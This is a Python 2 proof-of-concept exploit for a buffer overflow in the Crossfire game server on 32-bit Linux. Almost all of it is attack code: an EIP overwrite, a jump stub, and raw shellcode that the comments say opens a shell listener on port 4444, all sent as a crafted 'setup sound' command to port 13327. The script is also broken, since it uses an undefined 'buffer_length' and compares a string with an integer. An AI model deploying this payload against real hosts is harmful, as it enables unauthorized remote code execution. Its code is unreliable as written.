#!/usr/bin/python
#crossfire_poc.py POC Exploit for crossfire game in linux 32bit 486 debian kernel
import socket
import sys

#The host will listen on its local IP on 4444 (the port is coded within the shellcode)
host = "127.0.0.1"

#desired overwrite of EIP
eip = "\x97\x45\x13\x08"

#This code will add 12 bytes to EAX properly aligning our shelcode to the beginning of our overflow
stage_one_shellcode = "\x83\xC0\x0C\xFF\xE0\x90\x90"

#This contains our executable stage_one_shellcode
stage_two_shellcode = ("\xd9\xed\xd9\x74\x24\xf4\xbb\xf8\xbc\x4b\xfa\x5d\x31\xc9\xb1"
"\x14\x31\x5d\x19\x03\x5d\x19\x83\xc5\x04\x1a\x49\x7a\x21\x2d"
"\x51\x2e\x96\x82\xfc\xd3\x91\xc5\xb1\xb2\x6c\x85\xe9\x64\x3d"
"\xed\x0f\x99\xd0\xb1\x65\x89\x83\x19\xf3\x48\x49\xff\x5b\x46"
"\x0e\x76\x1a\x5c\xbc\x8c\x2d\x3a\x0f\x0c\x0e\x73\xe9\xc1\x11"
"\xe0\xaf\xb3\x2e\x5f\x9d\xc3\x18\x26\xe5\xab\xb5\xf7\x66\x43"
"\xa2\x28\xeb\xfa\x5c\xbe\x08\xac\xf3\x49\x2f\xfc\xff\x84\x30")

#Buffer to go after shellcode to align offsets (Length is calulated automatically based on len() of other variables)
crash = "\x41" * (buffer_length - len(stage_one_shellcode) - len(stage_two_shellcode) - len(eip))

crash_buffer = stage_two_shellcode + crash + eip + stage_one_shellcode
if crash_buffer == buffer_length:
    buffer = "\x11(setup sound " + stage_two_shellcode + crash + eip + stage_one_shellcode + "\x90\x00#"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print "[*]Sending evil buffer..."
    s.connect((host, 13327))
    data=s.recv(1024)
    print data
    s.send(buffer)
    s.close()
    print "[*]Payload Sent !"
else:
    print "Something went wrong in calculating buffer size offsets will be off. Exiting Exploit..."
    sys.exit(1)